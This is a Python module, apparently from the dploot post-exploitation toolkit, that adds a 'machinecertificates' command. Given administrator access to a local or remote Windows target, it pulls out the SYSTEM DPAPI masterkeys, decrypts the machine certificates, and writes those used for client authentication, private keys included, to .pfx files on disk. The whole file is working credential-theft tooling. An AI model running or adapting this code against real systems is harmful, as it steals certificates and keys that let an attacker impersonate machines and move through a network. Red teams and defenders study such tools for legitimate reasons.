import argparse
import logging
from typing import Callable, Tuple

from dploot.action import DPLootAction
from dploot.lib.target import add_target_argument_group
from dploot.lib.utils import dump_looted_files_to_disk
from dploot.triage.certificates import CertificatesTriage
from dploot.triage.masterkeys import MasterkeysTriage


NAME = "machinecertificates"


class MachineCertificatesAction(DPLootAction):
    def __init__(self, options: argparse.Namespace) -> None:
        super().init_triage_generic(options)

    def run(self) -> None:
        super().run()
        if self.conn.is_admin():
            if self.masterkeys is None:

                def masterkey_triage(masterkey):
                    masterkey.dump()

                masterkeytriage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    per_masterkey_callback=masterkey_triage
                    if not self.options.quiet
                    else None,
                )
                logging.info("Triage SYSTEM masterkeys\n")
                self.masterkeys = masterkeytriage.triage_system_masterkeys()
                print()
                if self.outputdir is not None:
                    dump_looted_files_to_disk(self.outputdir, masterkeytriage.looted_files)

            def certificate_callback(certificate):
                if not self.options.dump_all and not certificate.clientauth:
                    return
                if not self.options.quiet:
                    certificate.dump()
                filename = f"{certificate.username}_{certificate.filename[:16]}.pfx"
                logging.critical("Writting certificate to %s" % filename)
                with open(filename, "wb") as f:
                    f.write(certificate.pfx)

            certificate_triage = CertificatesTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_certificate_callback=certificate_callback,
            )
            logging.info("Triage SYSTEM Certificates\n")
            certificate_triage.triage_system_certificates()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, certificate_triage.looted_files)

        else:
            logging.info("Not an admin, exiting...")

def entry(options: argparse.Namespace) -> None:
    a = MachineCertificatesAction(options)
    a.run()


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME, help="Dump system certificates from local or remote target"
    )

    group = subparser.add_argument_group("machinecertificates options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings"),
    )

    group.add_argument(
        "-outputfile",
        action="store",
        help=("Export keys to file"),
    )

    group.add_argument(
        "-dump-all",
        action="store_true",
        help=("Dump also certificates not used for client authentication"),
    )

    add_target_argument_group(subparser)

    return NAME, entry
